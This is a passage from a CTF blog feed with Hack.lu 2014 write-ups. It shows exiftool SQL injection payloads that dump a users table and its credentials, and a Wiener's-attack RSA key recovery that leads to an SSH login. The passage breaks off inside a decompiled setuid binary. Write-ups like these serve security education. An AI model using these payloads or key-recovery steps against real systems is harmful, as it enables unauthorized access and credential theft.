<p>The site is two separate pages. One is a simple submit form in which you upload an image to the site. It explicitly asks for .jpg or .jpeg images. The second page is a simple login form that has a valid username of <code>sheriff</code>, that can be detected based on differentiating responses of failed logins (invalid user vs invalid password).</p>

<p>The form submissions explicitly asks for .jpg or .jpeg images, however if you rename the extension of another file type it appears to pass but
has issues printing. After uploading the image, it displays three exif tags: <code>author</code>, <code>manufacturer</code>, and <code>model</code>. These tags, along with heigh tand width information are displayed in a table beneath the image.</p>

<p>First attempts were to embed javascript into exif tags using exiftool, assuming a sheriff user would login to view the criminals. The values appear to be HTML encoded, however providing a single quote led to a database error. Looks like SQL injection.</p>

<p>Here is the list of modifications I made to my jpeg to get info from the database:</p>

<ul>
<li><code>exiftool &quot;-artist=stacks0n&quot; hack.jpg</code>

<ul>
<li>ensure existence of Author field</li>
</ul></li>
<li><code>exiftool &quot;-artist=Artist','Manufacturer','Model') -- &quot; hack.jpg</code>

<ul>
<li>test injection</li>
</ul></li>
<li><code>exiftool -artist=Artist','Manufacturer',concat('a','b')) -- &quot; hack.jpg</code>

<ul>
<li>test for MySQL</li>
</ul></li>
<li><code>exiftool &quot;-artist=Artist','Manufacturer',(SELECT count(table_name) FROM information_schema.tables )) -- &quot; hack.jpg</code>

<ul>
<li>get number of tables (43)</li>
</ul></li>
<li><code>exiftool &quot;-artist=Artist','Manufacturer',(SELECT table_name FROM information_schema.tables LIMIT 42,1 )) -- &quot; hack.jpg</code>

<ul>
<li>get table name (users)</li>
</ul></li>
<li><code>exiftool &quot;-artist=Artist','Manufacturer',(SELECT column_name FROM information_schema.columns where table_name = 'users' LIMIT 0,1  )) -- &quot; hack.jpg</code>

<ul>
<li>get column names (id, name, password)</li>
</ul></li>
<li><code>exiftool &quot;-artist=Artist',(SELECT name from users where id = 1 ),(SELECT password from users where id = 1 )) -- &quot; hack.jpg</code>

<ul>
<li>get login info (sheriff, AO7eikkOCucCFJOyyaaQ)</li>
</ul></li>
</ul>

<p>Lastly, login as sheriff for flag.</p>

<h2>Solution</h2>

<p>You are sucessfully logged in.</p>

<p>Flag: flag{1_5h07_7h3_5h3r1ff}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - wiener]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-wiener/"/>
    <updated>2014-10-23T20:42:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-wiener</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>It&#8217;s gold rush time! The New York Herald just reported about the Californian gold rush. We know a sheriff there is hiring guys to help him fill his own pockets. We know he already has a deadful amount of gold in his secret vault. However, it is protected by a secret only he knows.
When new deputies apply for the job, they get their own secret, but that only provies entry to a vault of all deputy sheriffs. No idiot would store their stuff in this vault.
But maybe we can find a way to gain access to the sheriff&#8217;s vault? Have a go at it: </p>

<p>nc wildwildweb.fluxfingers.net 1426</p>

<p>You might also need <a href="https://wildwildweb.fluxfingers.net/static/chals/wiener_38ff175d336b9c75fbf1b77290978015.py">this</a>.</p>

<h2>Analysis</h2>

<p>When you connect to wildwildweb.fluxfingers.net on port 1426, you are greeted by a service that accepts commands to list users, register, and get a user&#8217;s public key. If you register with &#8216;r&#8217;, the service creates a user for you and then discloses that the &quot;locker&quot; is on port 1427. The wording hints that the goal for this challenge is to ssh into port 1427 as the sheriff. Using the &#8216;p&#8217; command, you can get the sheriff&#8217;s public key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAEAAoX41P4pzhFgXt8iGGiTfBtwrjduNNZ/m7eMKaLXnKRqYOoCpw/bQOgFtdhUJVlosrHwQ5Y9zWFxTOT8XHDsxNdWrRaF1mHbOdFagB0cOC7ZegSPD4XZCcgRaR0//iYutwzNH6fboap5E58hwUs9/pU0BJHP86WmrpYEMpV4259bzBkuFqpi9oeoA45gwBUY+MyqC+/ladra6OSTEKejw73c9jf8guU0C+9BBbUztqUxiVZQsu+jN9lMenZEd2e1EpoEvPPNlbtg9r/RoSZYUwEkrYxv1xZSuODrSC/MR1BDtBDfxP5fvGvaCMphJEKEpKtbMRvGad8MdTUmp5waVwAAAQACrrY39hUq/U+zot0WWuydW0XnDSuC54o1P3oXUYWdGW9Wy20RcAGV8Qaac9nlcQlQuBQimrTFVJODwsh+DNl/kEdIoTAkANx2tCWR2hfauvlGqq8WQPEyevFr5FuIMGA5R6nDMJyk1syfGivP2s8oX7wvcw5RWuHZNZHM2Y9cRnTsSlhZJkcA9wCk9Nz3w8NbvFefbr+A2jPGwR9oZVCSu+Zw1SJbjlcdWW/kJttZpqBar3ezkXRIss+8s71ke0Z3KxMTP8aP+ryzdSNyuUmjcEuFlt9KRPCFOT7iv4D485NxntlKs0iFL2peDEk++jLaW/YBBjoDO+r3O6R9ggXb sheriff</span></code></pre></td></tr></table></div></figure>

<p>This challenge also provided the source for the service listening on port 1426. Here is the important function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">create_parameters</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="mi">2048</span><span class="p">):</span>
</span><span class='line'>    <span class="n">p</span> <span class="o">=</span> <span class="n">get_prime</span><span class="p">(</span><span class="n">size</span> <span class="o">//</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="n">q</span> <span class="o">=</span> <span class="n">get_prime</span><span class="p">(</span><span class="n">size</span> <span class="o">//</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="n">N</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
</span><span class='line'>    <span class="n">phi_N</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>    <span class="n">d</span> <span class="o">=</span> <span class="n">prng</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="n">size</span> <span class="o">//</span> <span class="mi">5</span><span class="p">)</span>
</span><span class='line'>    <span class="n">e</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gmpy</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">phi_N</span><span class="p">))</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">e</span> <span class="o">*</span> <span class="n">d</span><span class="p">)</span> <span class="o">%</span> <span class="n">phi_N</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>    <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">assert</span> <span class="n">test_key</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">N</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span>
</span></code></pre></td></tr></table></div></figure>

<p>This function generates the public and private keys used in RSA. The public key consists of the modulus <em>N</em> and public exponent <em>e</em>, and the private key consists of the modulus <em>N</em> and private exponent <em>d</em>. 
The trick to this challenge is to notice that the private exponent <em>d</em> generated by this function is small relative to <em>N</em>. The vulnerability is in the challenge&#8217;s name: Wiener&#8217;s attack on RSA.</p>

<h2>Solution</h2>

<p>Now we know that the goal is to ssh into port 1427 on wildwildweb.fluxfingers.net as the sheriff. We can accomplish this by calculating his private exponent <em>d</em> using Wiener&#8217;s attack and generating his private key.</p>

<p>First, we extracted <em>N</em> and <em>e</em> from the sheriff&#8217;s public key:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ssh-keygen -f sheriffkey -e -m PKCS8 | openssl rsa -pubin -text
</span><span class='line'>Public-Key: <span class="o">(</span>2042 bit<span class="o">)</span>
</span><span class='line'>Modulus:
</span><span class='line'>02:ae:b6:37:f6:15:2a:fd:4f:b3:a2:dd:16:5a:ec:
</span><span class='line'>9d:5b:45:e7:0d:2b:82:e7:8a:35:3f:7a:17:51:85:
</span><span class='line'>9d:19:6f:56:cb:6d:11:70:01:95:f1:06:9a:73:d9:
</span><span class='line'>e5:71:09:50:b8:14:22:9a:b4:c5:54:93:83:c2:c8:
</span><span class='line'>7e:0c:d9:7f:90:47:48:a1:30:24:00:dc:76:b4:25:
</span><span class='line'>91:da:17:da:ba:f9:46:aa:af:16:40:f1:32:7a:f1:
</span><span class='line'>6b:e4:5b:88:30:60:39:47:a9:c3:30:9c:a4:d6:cc:
</span><span class='line'>9f:1a:2b:cf:da:cf:28:5f:bc:2f:73:0e:51:5a:e1:
</span><span class='line'>d9:35:91:cc:d9:8f:5c:46:74:ec:4a:58:59:26:47:
</span><span class='line'>00:f7:00:a4:f4:dc:f7:c3:c3:5b:bc:57:9f:6e:bf:
</span><span class='line'>80:da:33:c6:c1:1f:68:65:50:92:bb:e6:70:d5:22:
</span><span class='line'>5b:8e:57:1d:59:6f:e4:26:db:59:a6:a0:5a:af:77:
</span><span class='line'>b3:91:74:48:b2:cf:bc:b3:bd:64:7b:46:77:2b:13:
</span><span class='line'>13:3f:c6:8f:fa:bc:b3:75:23:72:b9:49:a3:70:4b:
</span><span class='line'>85:96:df:4a:44:f0:85:39:3e:e2:bf:80:f8:f3:93:
</span><span class='line'>71:9e:d9:4a:b3:48:85:2f:6a:5e:0c:49:3e:fa:32:
</span><span class='line'>da:5b:f6:01:06:3a:03:3b:ea:f7:3b:a4:7d:82:05:
</span><span class='line'>db
</span><span class='line'>Exponent:
</span><span class='line'>02:85:f8:d4:fe:29:ce:11:60:5e:df:22:18:68:93:
</span><span class='line'>7c:1b:70:ae:37:6e:34:d6:7f:9b:b7:8c:29:a2:d7:
</span><span class='line'>9c:a4:6a:60:ea:02:a7:0f:db:40:e8:05:b5:d8:54:
</span><span class='line'>25:59:68:b2:b1:f0:43:96:3d:cd:61:71:4c:e4:fc:
</span><span class='line'>5c:70:ec:c4:d7:56:ad:16:85:d6:61:db:39:d1:5a:
</span><span class='line'>80:1d:1c:38:2e:d9:7a:04:8f:0f:85:d9:09:c8:11:
</span><span class='line'>69:1d:3f:fe:26:2e:b7:0c:cd:1f:a7:db:a1:aa:79:
</span><span class='line'>13:9f:21:c1:4b:3d:fe:95:34:04:91:cf:f3:a5:a6:
</span><span class='line'>ae:96:04:32:95:78:db:9f:5b:cc:19:2e:16:aa:62:
</span><span class='line'>f6:87:a8:03:8e:60:c0:15:18:f8:cc:aa:0b:ef:e5:
</span><span class='line'>69:da:da:e8:e4:93:10:a7:a3:c3:bd:dc:f6:37:fc:
</span><span class='line'>82:e5:34:0b:ef:41:05:b5:33:b6:a5:31:89:56:50:
</span><span class='line'>b2:ef:a3:37:d9:4c:7a:76:44:77:67:b5:12:9a:04:
</span><span class='line'>bc:f3:cd:95:bb:60:f6:bf:d1:a1:26:58:53:01:24:
</span><span class='line'>ad:8c:6f:d7:16:52:b8:e0:eb:48:2f:cc:47:50:43:
</span><span class='line'>b4:10:df:c4:fe:5f:bc:6b:da:08:ca:61:24:42:84:
</span><span class='line'>a4:ab:5b:31:1b:c6:69:df:0c:75:35:26:a7:9c:1a:
</span><span class='line'>57
</span></code></pre></td></tr></table></div></figure>

<p>We wrote a script to convert those values into integers and used <a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a> to recover <em>d</em>. 
Note: We had to increase the recursion limit with sys.setrecursionlimit(10000).</p>

<p>Here are the values we found for <em>N</em>, <em>e</em>, and <em>d</em>:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">modulus</span> <span class="mi">338630205260455689413627911306068443537112802550361922213620660503310212139001530156458392949653034244789612680980241965923780722889133495349537107789761426092510299239678696031652780059016898519278860185536978111680123402473365833456785718098200501968322228116681190425490850863660038143310790555506293106653050174262471649179173093656763946257235681980586392230447218179278964626176124426615857733950102117938674282636936094069075258237416065546593509302494726576026227551920883962084579635168761189995794814926094510046419165007371450799003658587100556051088147493947712592469412133312536422828670173807709914587</span>
</span><span class='line'><span class="n">public</span> <span class="n">exponent</span> <span class="mi">318540665379393469901456665807211509077755719995811520039095212139429238053864597311950397094944291616119321660193803737677538864969915331331528398734504661147661499115125056479426948683504604460936703005724827506058051215012025774714463561829608252938657297504427643593752676857551877096958959488289759878259498255905255543409142370769036479607835226542428818361327569095305960454592450213005148130508649794732855515489990191085723757628463901282599712670814223322126866814011761400443596552984309315434653984387419451894484613987942298157348306834118923950284809853541881602043240244910348705406353947587203832407</span>
</span><span class='line'><span class="n">private</span> <span class="n">exponent</span> <span class="mi">724746542590011388513367385228693742222740657137483753552318433232068370338961145215199994578740789016238655979015224570943</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We then used <a href="https://gist.github.com/ddddavidee/b34c2b67757a54ce75cb">https://gist.github.com/ddddavidee/b34c2b67757a54ce75cb</a> to recover <em>p</em> and <em>q</em>:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="mi">12001304129015480165432875074437607933493850611499879464845243350215176144760883615322622081442653872645865326992384034722586201972392183010813439352778246403016897976571514715418700569567613729681273931557848857971070286176848136118602099586101089743239644367344468295964691411425416652519752140536869089101</span>
</span><span class='line'><span class="n">q</span> <span class="o">=</span> <span class="mi">28216117316929874067495888027767527011360661622486842768414059951572932145196930641365509243766454218518793508840136548374994021850853203018205749779390383366761851772055038753940967432004901699256177783249460134792699230632136386268348434203012426963129659057781488950062703849444443906614331812260961682887</span>
</span></code></pre></td></tr></table></div></figure>
Now that we had all of the parameters, we used a function from the provided source code to generate the private key:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">asn1<em>encode</em>priv<em>key</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">):</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="n">pyasn1</em>modules</span><span class="o">.</span><span class="n">rfc3447</span><span class="o">.</span><span class="n">RSAPrivateKey</span><span class="p">()</span>
</span><span class='line'>    <span class="n">dp</span> <span class="o">=</span> <span class="n">d</span> <span class="o">%</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>    <span class="n">dq</span> <span class="o">=</span> <span class="n">d</span> <span class="o">%</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>    <span class="n">qInv</span> <span class="o">=</span> <span class="n">gmpy</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span><span class='line'>    <span class="k">assert</span> <span class="p">(</span><span class="n">qInv</span> <span class="o">*</span> <span class="n">q</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span> <span class="o">==</span> <span class="mi">1</span>
</span><span class='line'>    <span class="n">key</span><span class="o">.</span><span class="n">setComponentByName</span><span class="p">(</span><span class="s">&#39;version&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="n">key</span><span class="o">.</span><span class="n">setComponentByName</span><span class="p">(</span><span class="s">&#39;modulus&#39;</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
</span><span class='line'>    <span class="n">key</span><span class="o">.</span><span class="n">setComponentByName</span><span class="p">(</span><span class="s">&#39;publicExponent&#39;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span><span class='line'>    <span class="n">key</span><span class="o">.</span><span class="n">setComponentByName</span><span class="p">(</span><span class="s">&#39;privateExponent&#39;</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span>
</span><span class='line'>    <span class="n">key</span><span class="o">.</span><span class="n">setComponentByName</span><span class="p">(</span><span class="s">&#39;prime1&#39;</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span><span class='line'>    <span class="n">key</span><span class="o">.</span><span class="n">setComponentByName</span><span class="p">(</span><span class="s">&#39;prime2&#39;</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>
</span><span class='line'>    <span class="n">key</span><span class="o">.</span><span class="n">setComponentByName</span><span class="p">(</span><span class="s">&#39;exponent1&#39;</span><span class="p">,</span> <span class="n">dp</span><span class="p">)</span>
</span><span class='line'>    <span class="n">key</span><span class="o">.</span><span class="n">setComponentByName</span><span class="p">(</span><span class="s">&#39;exponent2&#39;</span><span class="p">,</span> <span class="n">dq</span><span class="p">)</span>
</span><span class='line'>    <span class="n">key</span><span class="o">.</span><span class="n">setComponentByName</span><span class="p">(</span><span class="s">&#39;coefficient&#39;</span><span class="p">,</span> <span class="n">qInv</span><span class="p">)</span>
</span><span class='line'>    <span class="n">ber<em>key</span> <span class="o">=</span> <span class="n">pyasn1</span><span class="o">.</span><span class="n">codec</span><span class="o">.</span><span class="n">ber</span><span class="o">.</span><span class="n">encoder</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span><span class='line'>    <span class="n">pem</em>key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">ber<em>key</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&quot;ascii&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">out</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;-----BEGIN RSA PRIVATE KEY-----&#39;</span><span class="p">]</span>
</span><span class='line'>    <span class="n">out</span> <span class="o">+=</span> <span class="p">[</span><span class="n">pem</em>key</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">64</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">pem_key</span><span class="p">),</span> <span class="mi">64</span><span class="p">)]</span>
</span><span class='line'>    <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&#39;-----END RSA PRIVATE KEY-----</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">out</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">out</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;ascii&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Finally, we could ssh into the server and grab the flag:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ssh -i sheriff<em>priv sheriff@wildwildweb.fluxfingers.net -p 1427
</span><span class='line'>Woah look how much gold that old croaker has: flag<span class="o">{</span>TONS</em>OF<em>GOLD</em>SUCH<em>WOW</em>MUCH_GLOW<span class="o">}</span>
</span><span class='line'>Connection to wildwildweb.fluxfingers.net closed.
</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - Gunslinger Joe's Gold Stash]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-gunslinger-joes-gold-stash/"/>
    <updated>2014-10-23T13:39:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-gunslinger-joes-gold-stash</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>Silly Gunslinger Joe has learned from his mistakes with his private terminal and
now tries to remember passwords. But he&#8217;s gotten more paranoid and chose to
develope an additional method: protect all his private stuff with a secure
locking mechanism that no one would be able to figure out! He&#8217;s so confident
with this new method that he even started using it to protect all his precious
gold. So … we better steal all of it!</p>

<p>SSH: joes_gold@wildwildweb.fluxfingers.net</p>

<p>PORT: 1415</p>

<p>PASSWORD: 1gs67uendsx71xmma8</p>

<h2>Analysis</h2>

<p>Provided with a regular shell. There is a set uid/gid program &#8216;gold_stash&#8217; for
gold group and a FLAG owned by gold.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>joes_gold@goldstash:~$ id
</span><span class='line'>uid=1000(joes_gold) gid=1000(joes_gold) groups=1000(joes_gold)
</span><span class='line'>
</span><span class='line'>joes_gold@goldstash:~$ ls -al
</span><span class='line'>drwxr-xr-x 2 joes_gold joes_gold  4096 Oct  6 23:09 .
</span><span class='line'>drwxr-xr-x 3 root      root       4096 Oct  6 22:56 ..
</span><span class='line'>-rw-r--r-- 1 joes_gold joes_gold  3106 Feb 20  2014 .bashrc
</span><span class='line'>-r-------- 1 gold      gold         46 Oct  6 23:04 FLAG
</span><span class='line'>-rwsr-sr-x 1 gold      gold      13186 Oct  6 23:03 gold_stash
</span><span class='line'>
</span><span class='line'>joes_gold@goldstash:~$ id -u gold
</span><span class='line'>1001</span></code></pre></td></tr></table></div></figure>

<p>Here is the decompiled code of gold_stash:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">__uid_t</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// er12@7</span>
</span><span class='line'>  <span class="n">__uid_t</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// ebx@7</span>
</span><span class='line'>  <span class="n">__uid_t</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// eax@7</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@8</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// rcx@8</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">argva</span><span class="p">;</span> <span class="c1">// [sp+0h] [bp-230h]@7</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [sp+8h] [bp-228h]@7</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">username</span><span class="p">;</span> <span class="c1">// [sp+10h] [bp-220h]@1</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">password</span><span class="p">;</span> <span class="c1">// [sp+110h] [bp-120h]@1</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [sp+218h] [bp-18h]@1</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v12</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mh">0x28LL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">password</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;          (_/-------------_______________________)&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;          `|  /~~~~~~~~~~</span><span class="se">\\</span><span class="s">                       |&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;           ;  |--------(-||______________________|&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;           ;  |--------(-| ____________|&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;           ;  </span><span class="se">\\</span><span class="s">__________/&#39;&quot;</span><span class="p">);</span>
